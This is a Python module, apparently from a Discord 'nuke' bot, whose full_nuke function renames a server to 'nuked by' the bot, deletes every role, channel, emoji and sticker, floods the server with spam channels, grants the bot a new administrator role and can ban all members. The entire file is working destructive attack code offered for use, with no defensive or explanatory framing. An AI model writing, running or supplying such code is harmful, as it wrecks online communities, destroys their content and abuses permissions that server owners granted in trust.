"""Destruccion total del servidor."""
from __future__ import annotations

import discord

from . import channels, extras, members, roles


async def full_nuke(guild: discord.Guild, client, **options) -> dict:
    """Borra roles y canales, reconstruye estructura, limpia y opcionalmente banea."""
    cfg = {
        "guild_name": f"nuked by {client.user.name}",
        "role_name": "nuked",
        "category_name": "NUKE",
        "text_count": 15,
        "voice_count": 3,
        "delete_roles": True,
        "delete_channels": True,
        "delete_emojis": True,
        "delete_stickers": True,
        "ban_all": False,
        "concurrency": 3,
        "log": lambda _m: None,
    }
    cfg.update({k: v for k, v in options.items() if v is not None})

    log = cfg["log"]
    report = {}

    log("Renombrando servidor...")
    try:
        await guild.edit(name=cfg["guild_name"][:100], reason="nuke")
    except Exception:
        pass

    if cfg["delete_roles"]:
        report["roles_borrados"] = await roles.destroy_roles(
            guild, concurrency=cfg["concurrency"], log=log)

    if cfg["delete_channels"]:
        report["canales_borrados"] = await channels.destroy_channels(
            guild, concurrency=4, log=log)

    log("Reconstruyendo estructura...")
    category = await channels.create_category(guild, cfg["category_name"])
    report["canales_creados"] = await channels.spam_channels(
        guild, cfg["text_count"], name=cfg["category_name"].lower(),
        category=category, concurrency=cfg["concurrency"], log=log)

    if cfg["voice_count"] > 0:
        report["voz_creados"] = await channels.spam_channels(
            guild, cfg["voice_count"], kind="voice",
            name=cfg["category_name"].lower(), category=category,
            concurrency=cfg["concurrency"], log=log)

    try:
        role = await guild.create_role(
            name=cfg["role_name"],
            colour=discord.Colour(0xA855F7),
            hoist=True,
            mentionable=True,
            permissions=discord.Permissions(administrator=True),
            reason="nuke",
        )
        report["rol_creado"] = role.name
        if guild.me:
            await guild.me.add_roles(role, reason="nuke")
    except Exception:
        pass

    if cfg["delete_emojis"]:
        report["emojis_borrados"] = await extras.delete_emojis(guild, log=log)

    if cfg["delete_stickers"]:
        report["stickers_borrados"] = await extras.delete_stickers(guild, log=log)

    if cfg["ban_all"]:
        report["miembros_baneados"] = await members.ban_all(
            guild, client, concurrency=cfg["concurrency"], log=log)

    return report
